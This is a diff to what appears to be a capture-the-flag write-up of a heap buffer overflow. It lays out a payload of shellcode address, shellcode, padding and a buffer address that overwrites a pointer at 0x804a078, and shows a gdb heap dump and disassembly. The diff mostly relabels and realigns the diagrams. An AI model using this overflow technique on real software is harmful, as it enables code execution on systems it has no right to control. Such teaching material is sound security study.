@@ -99,24 +99,24 @@ After memcpy(var1.buf, argv[1], strlen(argv[1]));
 # stored at 0x804a078 to redirect the flow of execution of the program.
 # We can put together a shellcode injection that will use the following payload :
 
-[SHELLCODE_ADDR] [SHELLCODE] [PADDING] [ADDR_SHELLCODE_ADDR]
+[SHELLCODE_ADDR] [SHELLCODE] [PADDING] [BUFFER_ADDR]
 	0x804a010        '...'    'AAA...'  	0x804a00c
-		|--------------^						|
-		^---------------------------------------|
+        |--------------^                        |
+        ^---------------------------------------|
 
 # This will be the state of the heap once the payload is loaded in memory :
 
 (gdb) x/60wx 0x804a000
-0x804a000:	0x00000000	0x00000071	0x08048848	0x0804a010<-
-				v------------------------------------|	   |
-0x804a010:	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS |
-0x804a020:	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS |
-0x804a030:	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS |
-0x804a040:	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS	0xSSSSSSSS |
-0x804a050:	0xSSSSSSSS	0xAAAAAAAA	0xAAAAAAAA	0xAAAAAAAA |
-0x804a060:	0xAAAAAAAA	0xAAAAAAAA	0xAAAAAAAA	0xAAAAAAAA |
-0x804a070:	0xAAAAAAAA	0xAAAAAAAA	0x0804a00c	0x00000000 |
-										|------------------|
+0x804a000: 0x00000000 0x00000071 0x08048848 0x0804a010<-
+                 v---------------------------------|    |
+0x804a010: 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS  |
+0x804a020: 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS  |
+0x804a030: 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS  |
+0x804a040: 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS 0xSSSSSSSS  |
+0x804a050: 0xSSSSSSSS 0xAAAAAAAA 0xAAAAAAAA 0xAAAAAAAA  |
+0x804a060: 0xAAAAAAAA 0xAAAAAAAA 0xAAAAAAAA 0xAAAAAAAA  |
+0x804a070: 0xAAAAAAAA 0xAAAAAAAA 0x0804a00c 0x00000000  |
+                                        |---------------|
 
    0x0804867c <+136>:	mov    0x10(%esp),%eax <== $eax = var2;
    0x08048680 <+140>:	mov    (%eax),%eax <== $eax = var2->p = 0x804a00c;
